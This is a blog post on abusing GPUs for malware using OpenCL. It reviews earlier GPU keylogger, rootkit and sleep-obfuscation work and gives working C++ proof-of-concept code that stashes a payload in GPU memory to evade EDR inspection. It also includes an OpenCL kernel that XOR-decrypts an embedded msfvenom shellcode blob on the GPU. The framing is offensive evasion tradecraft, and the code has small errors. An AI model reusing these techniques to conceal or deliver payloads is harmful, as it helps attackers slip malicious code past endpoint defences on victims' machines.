<!doctype html><html lang=en-us><head><title>Abusing the GPU for Malware with OpenCL // eversinc33</title><link rel="shortcut icon" href=/favicon.ico><meta charset=utf-8><meta name=generator content="Hugo 0.108.0"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=author content="eversinc33"><meta name=description content><link rel=stylesheet href=https://eversinc33.github.io/css/main.min.56496327917020e2615871d48104da92f34d7c476ef1cb3f79a86ca13745a2ab.css><meta name=twitter:card content="summary"><meta name=twitter:title content="Abusing the GPU for Malware with OpenCL"><meta name=twitter:description content="I like esoteric programming topics, such as outsider languages or using obscure techniques to achieve some sort of goal. However, dabbling into these topics is usually somehow a waste of time, if theres no real-world use to it. With malware development however, weird approaches to problems can be very beneficial, as they may aid in evasion. One of these topics which I always had on my list to get into, was abusing the GPU for malware."><meta property="og:title" content="Abusing the GPU for Malware with OpenCL"><meta property="og:description" content="I like esoteric programming topics, such as outsider languages or using obscure techniques to achieve some sort of goal. However, dabbling into these topics is usually somehow a waste of time, if theres no real-world use to it. With malware development however, weird approaches to problems can be very beneficial, as they may aid in evasion. One of these topics which I always had on my list to get into, was abusing the GPU for malware."><meta property="og:type" content="article"><meta property="og:url" content="https://eversinc33.github.io/posts/gpu-malware/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-03-18T18:49:31+02:00"><meta property="article:modified_time" content="2023-03-18T18:49:31+02:00"></head><body><header class=app-header><a href=https://eversinc33.github.io><img class=app-header-avatar src="https://avatars.githubusercontent.com/u/51821028?v=4" alt=eversinc33></a><h1>eversinc33</h1><p>bits about malware development and penetration testing</p><div class=app-header-social><a href=https://github.com/eversinc33 target=_blank rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github"><title>My Github</title><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg></a><a href=https://twitter.com/eversinc33 target=_blank rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter"><title>My Twitter</title><path d="M23 3a10.9 10.9.0 01-3.14 1.53 4.48 4.48.0 00-7.86 3v1A10.66 10.66.0 013 4s-4 9 5 13a11.64 11.64.0 01-7 2c9 5 20 0 20-11.5a4.5 4.5.0 00-.08-.83A7.72 7.72.0 0023 3z"/></svg></a><a href=https://www.linkedin.com/in/sven-rath-4212ba1b8/ target=_blank rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-linkedin"><title>My linkedin</title><path d="M16 8a6 6 0 016 6v7h-4v-7a2 2 0 00-2-2 2 2 0 00-2 2v7h-4v-7a6 6 0 016-6z"/><rect x="2" y="9" width="4" height="12"/><circle cx="4" cy="4" r="2"/></svg></a></div></header><main class=app-container><article class=post><header class=post-header><h1 class=post-title>Abusing the GPU for Malware with OpenCL</h1><div class=post-meta><div><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar"><title>calendar</title><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>Mar 18, 2023</div><div><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock"><title>clock</title><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>11 min read</div></div></header><div class=post-content><p>I like esoteric programming topics, such as outsider languages or using obscure techniques to achieve some sort of goal. However, dabbling into these topics is usually somehow a waste of time, if theres no real-world use to it. With malware development however, weird approaches to problems can be very beneficial, as they may aid in evasion. One of these topics which I always had on my list to get into, was abusing the GPU for malware.</p><p>In this post I want to write a little bit about the thoughts and ideas I had when researching this recently. This is however not a comprehensive guide, there are no new techniques nor a comprehensive tutorial on implementing any. If anything, this is more of a short diary entry which might hopefully spark some interest or discussion.</p><p>If you have been looking into GPU malware or know more about it, please hit me up on <a href=https://twitter.com/eversinc33>Twitter</a> and I would love to have a chat about it!</p><p>So we all know Graphic Processing Units (GPUs) as the chips in graphics cards that allow us to play the newest games in stunning resolutions. But what actually is a GPU and how does it relate to the CPU?</p><h1 id=primer-on-gpu-computing>Primer on GPU computing</h1><p>GPUs were invented to have a processor where the CPU can offload tasks to, if these tasks require a lot of parallelism, such as graphic transformations. Here, you usually have thousands of vertices, pixels or matrices and the GPU is designed to excel at tasks where the same computation is applied to many many different data objects. While the GPU can be a separate device to the CPU, there are also GPUs that are integrated into CPUs, such as those used in many laptop devices today.</p><p>Besides the processor cores, the GPU also employs its own RAM, where arbitrary data, e.g. image data, can be stored.</p><p>Since CPU I/O can become a bottleneck for GPU performance, many GPUs also feature a <a href=https://en.wikipedia.org/wiki/Direct_memory_access>Direct Memory Access</a> (DMA). This is basically a direct highway between the GPU and the memory, allowing it to bypass the CPU and directly write to memory.</p><p>Now what&rsquo;s so great about GPUs and malware is that, at least to my knowledge, there are no EDR&rsquo;s yet that inspect GPU memory for malicious indicators or hook code running on the GPU. I think it might be possible though that sandboxes, which run malware in a virtualized environment, might already analyze GPU memory, since they are emulating or virtualizing it anyway. Also bypassing the CPU with DMA and thus effectively evading hooks for reading or writing to memory sounds like an idea to me.</p><p>However, GPU malware is not a hot new topic and has been explored and researched for a while already.</p><h1 id=public-work-on-gpu-malware>Public work on GPU Malware</h1><p>The <a href=https://recon.cx/2012/schedule/attachments/38_cfp_response.pdf>earliest paper</a> on GPU malware that I found is actually from the defensive side and deals with using the GPU to aid in detection of malware on iOS using OpenGL shaders. However, the other states in a side note, that the same techniques can also be used for offensive purposes.</p><p>The earliest piece of research for <a href=http://www.cs.columbia.edu/~mikepo/papers/gpukeylogger.eurosec13.pdf>GPU malware targeting desktop systems</a> that I could find is from 2013 and describes a keylogger implemented in GPU code using CUDA that runs on Linux systems. This keylogger basically uses the DMA to read out the keyboard-buffer in memory, thus bypassing the CPU. The CPU is only needed for the bootstrapping process, where it needs to scan the host memory for the location of the keyboard-buffer - once that location is found, this address is passed to the GPU-code, which will then continously read out that memory to detect keystrokes. In order to access this memory, <code>root</code> privileges are required. Also, the memory page has to be mapped to the process once, in order for the CUDA API to accept the address for the DMA - it can afterwards be released and still be read by the GPU process, since it is using DMA anyway. A PoC is <a href=https://github.com/akiraaisha/Demon>available</a> under the name <code>Demon</code>, developed by Team Jellyfish.</p><p>The same team also released a rootkit called <a href=https://github.com/LucaBongiorni/jellyfish/tree/master>Jellyfish</a> which also runs on Linux and abuses <code>LD_PRELOAD</code> to hook systemcalls and then stores information parsed from these system calls into GPU memory, e.g. which files were opened or which directories were created.</p><p>Regarding Windows malware, I found a few projects on GitHub which were interesting.</p><p>On <a href=https://papers.vx-underground.org/papers/Windows/Evasion%20-%20Systems%20Call%20and%20Memory%20Evasion/2022-04-11%20-%20Demonstrating%20Copying%20Data%20To%20A%20GPU%20-%20GpuMemoryAbuse.cpp>vx-underground</a>, a rather recent piece of code from 2022, written by smelly__vx, describes using the CUDA API to write to and read from GPU memory.</p><p>A use case that might come to mind when reading this is to combine this with sleep obfuscation, e.g. run a payload and when it sleeps, move it into GPU memory and then afterwards, read it back into memory to proceed running it. Example implementations can be found in <a href=https://github.com/NUL0x4C>NUL0x4C</a>&rsquo;s <a href=https://github.com/NUL0x4C/GP/tree/main>GPU Poisoning</a> technique or in <a href=https://oxis.github.io/GPUSleep/>oXis</a> GPUSleep technique, who also wrote an awesome <a href=https://oxis.github.io/GPUSleep/>blog post</a> about it. Again, both these techniques use smelly__vx&rsquo;s code snippets and thus use the CUDA API, making them reliant on NVIDIA graphics cards.</p><p>Finally, since we can offload tasks to the GPU, what would also be possible is to use the GPU to e.g. decrypt encrypted shellcode - different implementations, such as <a href=https://github.com/cartermc24/AES-OpenCL>AES for the GPU in OpenCL</a> exist and could be abused. However, this would only give a small benefit, since the payload would have to be read from the GPU into memory, before being able to be invoked by the CPU.</p><p>I read about other use-cases such as using the CPU as an anti-debugging technique, but I did not find any information about that. What would come to mind is to terminate a malware if no CUDA compatible card is found, indicating that a sandbox/VM is in use.</p><p>A lot of GPU malware seems to be based on CUDA. This leads us to the usual debate of which tools and frameworks to use.</p><h1 id=cuda-vs-opencl-vs-opengl>CUDA vs OpenCL vs OpenGL</h1><p>If you have been doing some graphics programming, e.g. when programming game engines or visualizers, you probably used OpenGL before. <a href=https://www.opengl.org/>OpenGL</a> is an API that allows you to use the GPU for graphics rendering. While we could leverage OpenGL for malware, e.g. by writing payloads to buffers or using shaders for computation, they are not designed for anything other than graphics programming (the same probably goes for DirectX, but I have never used that before). While writing malware based on shaders would certainly be a fun experiment, I don&rsquo;t see it as very practical.</p><p>Since however GPUs are more and more used for other tasks that need performant parallelism, e.g. machine learning, other APIs have come up, which can be used for more general computing tasks.</p><p>One of these is <a href=https://developer.nvidia.com/cuda-toolkit>CUDA</a> (Compute Unified Device Architecture): CUDA is NVIDIAs API for parallel computing on a GPU, released in 2007, that offers some more general access to GPU features. Since CUDA is proprietary however, using this API will make our malware only be able to run on NVIDIA graphic cards, and in addition only those that can run CUDA code.</p><p>Another, less restrictive (in terms of GPU targets) alternative to using CUDA is <a href=https://www.khronos.org/opencl/>OpenCL</a>, which is basically Apple&rsquo;s/Khronos&rsquo; answer to CUDA.</p><p>Code compiled to run a GPU is called a <code>Kernel</code> by both CUDA and OpenCL - these are programs that are invoked by the CPU to then run on the GPU. OpenCL can however compile these kernels dynamically at run-time, which enables us to use OpenCL to run code on NVIDIA GPUs as well as on the GPUs of other vendors. OpenCL kernels are written in a specific language, which is an extension to the C language.</p><p>To me, OpenCL seems like the better option to use, with its wider support. As such, I implemented some small PoCs using the OpenCL language.</p><h1 id=developing-with-opencl>Developing with OpenCL</h1><p>To develop with OpenCL you will need to install the OpenCL SDK that matches your GPU. Since a comprehensive tutorial, as mentioned above, is not in scope of this post, I will simply link you to these SDKs. For problems, consult the respective documentation:</p><ul><li>For NVIDIA GPUs download the <a href=http://developer.nvidia.com/object/cuda_download.html>CUDA Toolkit</a></li><li>For Intel GPUs download the <a href=https://www.intel.com/content/www/us/en/developer/tools/opencl-sdk/overview.html>Intel OpenCL SDK</a></li><li>For AMD GPUs download the <a href=https://developer.amd.com/amd-accelerated-parallel-processing-app-sdk/>AMD APP SDK</a></li></ul><p>Finally, the executable has to be linked to <code>OpenCL.lib</code> and we need to include the <a href=https://github.com/KhronosGroup/OpenCL-Headers>OpenCL-headers</a>, and in my case, since I am using C++, also the <a href=https://github.com/KhronosGroup/OpenCL-CLHPP>Cpp-headers</a>.</p><h1 id=gpu-memory-operations>GPU Memory Operations</h1><p>Let&rsquo;s start by implementing smelly__vx&rsquo;s GPU memory abuse code I mentioned above in device agnostic OpenCL. This is one of the simple primitives we can use if we want to incorporate the GPU into our malware and as such the first thing I want to show here. We can then use this e.g. to store arbitrary payloads and data into GPU memory.</p><p>As usual, error handling is removed from all code snippets here for brevity reasons.</p><p>First, we need some boilerplate code to find a suitable GPU and use it for our OpenCL API calls:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#75715e>#define CL_HPP_TARGET_OPENCL_VERSION 300
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;CL/opencl.hpp&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>void</span>) 
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#75715e>//get all platforms (drivers)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    std<span style=color:#f92672>::</span>vector<span style=color:#f92672>&lt;</span>cl<span style=color:#f92672>::</span>Platform<span style=color:#f92672>&gt;</span> all_platforms;
</span></span><span style=display:flex><span>    cl<span style=color:#f92672>::</span>Platform<span style=color:#f92672>::</span>get(<span style=color:#f92672>&amp;</span>all_platforms);
</span></span><span style=display:flex><span>    cl<span style=color:#f92672>::</span>Platform default_platform <span style=color:#f92672>=</span> all_platforms[<span style=color:#ae81ff>0</span>];
</span></span><span style=display:flex><span>    std<span style=color:#f92672>::</span>cout <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;Using platform: &#34;</span> <span style=color:#f92672>&lt;&lt;</span> default_platform.getInfo<span style=color:#f92672>&lt;</span>CL_PLATFORM_NAME<span style=color:#f92672>&gt;</span>() <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>//get default device of the default platform
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    std<span style=color:#f92672>::</span>vector<span style=color:#f92672>&lt;</span>cl<span style=color:#f92672>::</span>Device<span style=color:#f92672>&gt;</span> all_devices;
</span></span><span style=display:flex><span>    default_platform.getDevices(CL_DEVICE_TYPE_ALL, <span style=color:#f92672>&amp;</span>all_devices);
</span></span><span style=display:flex><span>    std<span style=color:#f92672>::</span>cout <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;Using device: &#34;</span> <span style=color:#f92672>&lt;&lt;</span> default_device.getInfo<span style=color:#f92672>&lt;</span>CL_DEVICE_NAME<span style=color:#f92672>&gt;</span>() <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// use default device and set up OpenCL
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    cl<span style=color:#f92672>::</span>Device default_device <span style=color:#f92672>=</span> all_devices[<span style=color:#ae81ff>0</span>];
</span></span><span style=display:flex><span>    cl<span style=color:#f92672>::</span>Context context({ default_device });
</span></span><span style=display:flex><span>    cl_int clError;
</span></span></code></pre></div><p>Afterwards, we can create a payload and set up an OpenCL command queue to move it into the GPU memory. Then we zero it out and read it back from the GPU memory:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>    <span style=color:#75715e>// Payload - one byte in this example. Could be shellcode or anything
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    size_t dataSize <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>int</span><span style=color:#f92672>*</span> dataArrayHost <span style=color:#f92672>=</span> (<span style=color:#66d9ef>int</span><span style=color:#f92672>*</span>)malloc(dataSize <span style=color:#f92672>*</span> <span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>int</span>));
</span></span><span style=display:flex><span>    dataArrayHost[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    std<span style=color:#f92672>::</span>cout <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;Array content: &#34;</span> <span style=color:#f92672>&lt;&lt;</span> dataArrayHost[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>&lt;&lt;</span> std<span style=color:#f92672>::</span>endl; <span style=color:#75715e>// prints 1
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>    cl_command_queue queue;
</span></span><span style=display:flex><span>    <span style=color:#75715e>// A command queue is needed to run OpenCL commands
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    queue           <span style=color:#f92672>=</span> clCreateCommandQueueWithProperties(context.get(), default_device.get(), NULL, <span style=color:#f92672>&amp;</span>clError);
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Create a buffer in GPU memory
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    cl_mem clBuffer <span style=color:#f92672>=</span> clCreateBuffer(context.get(), CL_MEM_READ_WRITE, dataSize <span style=color:#f92672>*</span> <span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>int</span>), NULL, <span style=color:#f92672>&amp;</span>clError);
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Write our payload to the Buffer
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    clError         <span style=color:#f92672>=</span> clEnqueueWriteBuffer(queue, clBuffer, CL_TRUE, <span style=color:#ae81ff>0</span>, dataSize, (<span style=color:#66d9ef>void</span><span style=color:#f92672>*</span>)dataArrayHost, <span style=color:#ae81ff>0</span>, NULL, NULL);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Zero out the memory, so we can see the loading actually suceeds
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    dataArrayHost[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>    std<span style=color:#f92672>::</span>cout <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;Array content: &#34;</span> <span style=color:#f92672>&lt;&lt;</span> dataArrayHost[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>&lt;&lt;</span> std<span style=color:#f92672>::</span>endl; <span style=color:#75715e>// prints 0
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Read the payload back from the GPU buffer into memory
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    clError <span style=color:#f92672>=</span> clEnqueueReadBuffer(queue, clBuffer, CL_TRUE, <span style=color:#ae81ff>0</span>, dataSize, (<span style=color:#66d9ef>void</span><span style=color:#f92672>*</span>)dataArrayHost, <span style=color:#ae81ff>0</span>, NULL, NULL);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    std<span style=color:#f92672>::</span>cout <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;Array content: &#34;</span> <span style=color:#f92672>&lt;&lt;</span> dataArrayHost[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>&lt;&lt;</span> std<span style=color:#f92672>::</span>endl; <span style=color:#75715e>// prints 1
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>}
</span></span></code></pre></div><p>So with these simple methods we would already be able to make the CUDA dependant POCs I referenced two sections above vendor-independent. What else can we do though?</p><h1 id=decrypting-shellcode-via-opencl-kernels>Decrypting Shellcode via OpenCL Kernels</h1><p>The following PoC is showing how to implement XOR-Decryption of shellcode on the GPU. However, this has the major caveat I mentioned above, which is that we still have to move the decrypted payload back into memory to execute it. Still, I found this an interesting exercise and we will also write our first actual OpenCL Kernel program here.</p><p>The full code is accessible on my <a href=https://github.com/eversinc33/GpuDecryptShellcode>GitHub</a>.</p><p>First we need to define our Kernel. I don&rsquo;t want to read from file, which is why I included it as a string. Thankfully, XOR is such a simple algorithm that the Kernel code is super small:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> xorKernelSource[] <span style=color:#f92672>=</span> { <span style=color:#75715e>//                                
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#e6db74>&#34;__kernel void decrypt(__global char* encrypted, __global char* password, __global char* output) { output[get_global_id(0)] = encrypted[get_global_id(0)] ^ password[0];  }&#34;</span>
</span></span><span style=display:flex><span>};
</span></span></code></pre></div><p>We define the Kernel-function <code>decrypt</code> which will do the decryption for us. <code>get_global_id(0)</code> gets the worker-thread ID, which is passed on to the Kernel when invoked later. We are running one thread for each byte in the shellcode, as you will see below.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>() 
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#75715e>// msfvenom calc payload, xor encrypted with &#39;k&#39; as key
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>char</span> buf[] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x97\x23\xe8\x8f\x9b\x83\xab\x6b\x6b\x6b\x2a\x3a\x2a\x3b\x39\x3a\x3d\x23\x5a\xb9\x0e\x23\xe0\x39\x0b\x23\xe0\x39\x73\x23\xe0\x39\x4b\x23\xe0\x19\x3b\x23\x64\xdc\x21\x21\x26\x5a\xa2\x23\x5a\xab\xc7\x57\x0a\x17\x69\x47\x4b\x2a\xaa\xa2\x66\x2a\x6a\xaa\x89\x86\x39\x2a\x3a\x23\xe0\x39\x4b\xe0\x29\x57\x23\x6a\xbb\xe0\xeb\xe3\x6b\x6b\x6b\x23\xee\xab\x1f\x0c\x23\x6a\xbb\x3b\xe0\x23\x73\x2f\xe0\x2b\x4b\x22\x6a\xbb\x88\x3d\x23\x94\xa2\x2a\xe0\x5f\xe3\x23\x6a\xbd\x26\x5a\xa2\x23\x5a\xab\xc7\x2a\xaa\xa2\x66\x2a\x6a\xaa\x53\x8b\x1e\x9a\x27\x68\x27\x4f\x63\x2e\x52\xba\x1e\xb3\x33\x2f\xe0\x2b\x4f\x22\x6a\xbb\x0d\x2a\xe0\x67\x23\x2f\xe0\x2b\x77\x22\x6a\xbb\x2a\xe0\x6f\xe3\x23\x6a\xbb\x2a\x33\x2a\x33\x35\x32\x31\x2a\x33\x2a\x32\x2a\x31\x23\xe8\x87\x4b\x2a\x39\x94\x8b\x33\x2a\x32\x31\x23\xe0\x79\x82\x3c\x94\x94\x94\x36\x23\xd1\x6a\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x23\xe6\xe6\x6a\x6a\x6b\x6b\x2a\xd1\x5a\xe0\x04\xec\x94\xbe\xd0\x9b\xde\xc9\x3d\x2a\xd1\xcd\xfe\xd6\xf6\x94\xbe\x23\xe8\xaf\x43\x57\x6d\x17\x61\xeb\x90\x8b\x1e\x6e\xd0\x2c\x78\x19\x04\x01\x6b\x32\x2a\xe2\xb1\x94\xbe\x08\x0a\x07\x08\x45\x0e\x13\x0e\x6b\x6b</span><span style=color:#e6db74>&#34;</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>char</span> key[] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;k&#34;</span>; <span style=color:#75715e>// our xor key
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>char</span> finalPayload[SHELLCODE_LENGTH] <span style=color:#f92672>=</span> { <span style=color:#ae81ff>0</span> }; <span style=color:#75715e>// buffer for the decrypted payload
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>/* Boilerplate code removed */</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Setup our buffers, so we can pass them to the Kernel
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#75715e>// We will map them as pointers to host memory
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    cl_mem shellcodeEncrypted <span style=color:#f92672>=</span> clCreateBuffer(context.get(), CL_MEM_READ_ONLY <span style=color:#f92672>|</span> CL_MEM_COPY_HOST_PTR, dataSize, buf, <span style=color:#f92672>&amp;</span>err);
</span></span><span style=display:flex><span>    cl_mem xorKey <span style=color:#f92672>=</span> clCreateBuffer(context.get(), CL_MEM_READ_ONLY <span style=color:#f92672>|</span> CL_MEM_COPY_HOST_PTR, <span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>char</span>), key, <span style=color:#f92672>&amp;</span>err);
</span></span><span style=display:flex><span>    <span style=color:#75715e>// the decrypted shellcode will be read out later and is not mapped to host memory in order to hide it as long as possible
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    cl_mem shellcodeDecryptedOut <span style=color:#f92672>=</span> clCreateBuffer(context.get(), CL_MEM_READ_WRITE, dataSize, NULL, <span style=color:#f92672>&amp;</span>err);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Create our kernel from source
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    cl_program kernel <span style=color:#f92672>=</span> clCreateProgramWithSource(context.get(), <span style=color:#ae81ff>1</span>, xorKernelSource, NULL, <span style=color:#f92672>&amp;</span>err);
</span></span><span style=display:flex><span>    cl_int res <span style=color:#f92672>=</span> clBuildProgram(kernel, <span style=color:#ae81ff>0</span>, NULL, NULL, NULL, NULL);
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Get a handle to the kernel function for decryption
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    cl_kernel decryptKernelFunctionHandle <span style=color:#f92672>=</span> clCreateKernel(kernel, <span style=color:#e6db74>&#34;decrypt&#34;</span>, <span style=color:#f92672>&amp;</span>err);
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Set arguments for the decryption function. These are the buffers we created earlier
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    clSetKernelArg(decryptKernelFunctionHandle, <span style=color:#ae81ff>0</span>, <span style=color:#66d9ef>sizeof</span>(cl_mem), (<span style=color:#66d9ef>void</span><span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>shellcodeEncrypted);
</span></span><span style=display:flex><span>    clSetKernelArg(decryptKernelFunctionHandle, <span style=color:#ae81ff>1</span>, <span style=color:#66d9ef>sizeof</span>(cl_mem), (<span style=color:#66d9ef>void</span><span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>xorKey);
</span></span><span style=display:flex><span>    clSetKernelArg(decryptKernelFunctionHandle, <span style=color:#ae81ff>2</span>, <span style=color:#66d9ef>sizeof</span>(cl_mem), (<span style=color:#66d9ef>void</span><span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>shellcodeDecryptedOut);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Launch the kernel on the GPU with one work item per byte
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    size_t workSize <span style=color:#f92672>=</span> SHELLCODE_LENGTH;
</span></span><span style=display:flex><span>    err <span style=color:#f92672>=</span> clEnqueueNDRangeKernel(queue, decryptKernelFunctionHandle, <span style=color:#ae81ff>1</span>, NULL, <span style=color:#f92672>&amp;</span>workSize, NULL, <span style=color:#ae81ff>0</span>, NULL, NULL);
</span></span><span style=display:flex><span>   
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Copy the output from GPU memory back to CPU memory
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    err <span style=color:#f92672>=</span> clEnqueueReadBuffer(queue, shellcodeDecryptedOut, CL_TRUE, <span style=color:#ae81ff>0</span>, dataSize, finalPayload, <span style=color:#ae81ff>0</span>, NULL, NULL);
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Print decrypted payload
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> SHELLCODE_LENGTH; i<span style=color:#f92672>++</span>)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        printf(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>x%02x&#34;</span>, (<span style=color:#66d9ef>char</span>)finalPayload[i]);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>/* Cleanup code removed */</span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Using this small program, we can offload our shellcode decryption to the GPU, potentially providing us with some additional stealth. While these PoCs are nothing outstanding, I still learned some things about GPU programming and hope that you did too. In my opinion, using the GPU is an area in malware development that can still be further explored.</p><p>Happy Hacking!</p></div><div class=post-footer></div></article></main></body></html>